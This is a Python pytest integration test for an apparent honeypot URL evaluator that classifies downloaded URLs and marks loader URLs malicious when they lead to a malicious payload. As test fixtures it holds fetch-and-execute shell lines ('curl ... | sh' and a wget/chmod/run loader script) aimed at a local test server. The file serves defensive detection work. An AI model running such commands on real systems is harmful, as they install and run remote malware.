"""IDEA event from Warden -> URLs in DB -> evaluator downloads them -> classification + back-propagation."""

import pytest

from tests.api_mocks import load_json

pytestmark = pytest.mark.integration


def idea_event(session):
    event = load_json("idea", "cowrie_session.json")
    event["Attach"] = [{"Type": ["ShellCode"], "Content": session}]
    return event


def classification(db, url):
    return db.execute("SELECT classification, classification_reason, evaluated FROM urls WHERE url = ?", (url,)).fetchone()


def test_malicious_payload_marks_its_loader_malicious(
        warden2evaluator_mod, evaluator_mod, httpserver, external_apis, run_evaluator, db):
    loader = httpserver.url_for("/loader.sh")
    payload = httpserver.url_for("/bins/x86")
    httpserver.expect_request("/loader.sh").respond_with_data(
        f"#!/bin/sh\ncd /tmp\nwget {payload} -O x86\nchmod +x x86; ./x86\n", content_type="text/x-shellscript")
    httpserver.expect_request("/bins/x86").respond_with_data(
        b"\x7fELF\x02\x01\x01" + b"\x00" * 120, content_type="application/octet-stream")
    external_apis(blacklist=[payload])  # only the payload is known to URLhaus

    # 1. Honeypot session arrives from Warden
    assert warden2evaluator_mod.handle_events([idea_event(f"curl -s {loader} | sh")]) == [loader]

    # 2. Evaluator downloads the loader, finds the payload URL in it and evaluates both
    assert run_evaluator(evaluator_mod) == [loader, payload]

    assert classification(db, payload) == ("malicious", "Blacklist check", "yes")
    # back-propagation: the loader downloaded a malicious payload
    assert classification(db, loader) == ("malicious", "Downloading from malicious URL", "yes")
    assert db.execute("SELECT url, src_url FROM discovered_urls").fetchall() == [(payload, loader)]
    history = db.execute("SELECT url, classification, actor FROM classification_history ORDER BY id").fetchall()
    assert history == [
        (loader, "unclassified", "evaluator"),
        (payload, "malicious", "evaluator"),
        (loader, "malicious", "evaluator-backprop"),
    ]
    # both downloads were stored with their fetch metadata
    rows = db.execute("SELECT url, source_ip, status_code, change_type FROM download_observations ORDER BY id").fetchall()
    assert rows == [(loader, "127.0.0.1", 200, "initial"), (payload, "127.0.0.1", 200, "initial")]


def test_vt_quota_postpones_url_until_reset(evaluator_mod, httpserver, external_apis, run_evaluator, db):
    from tests.factories import insert_url
    url = insert_url(db, httpserver.url_for("/a.sh"))
    httpserver.expect_request("/a.sh").respond_with_data("echo hi\n", content_type="text/plain")
    external_apis(vt_url="quota_exceeded.json")

    assert run_evaluator(evaluator_mod) == [url]

    assert db.execute("SELECT evaluated, eval_later FROM urls").fetchone() == ("no", "yes")
    assert db.execute("SELECT COUNT(*) FROM classification_history").fetchone()[0] == 0  # no decision yet
    assert evaluator_mod.next_url() is None  # skipped while the daily quota is exceeded
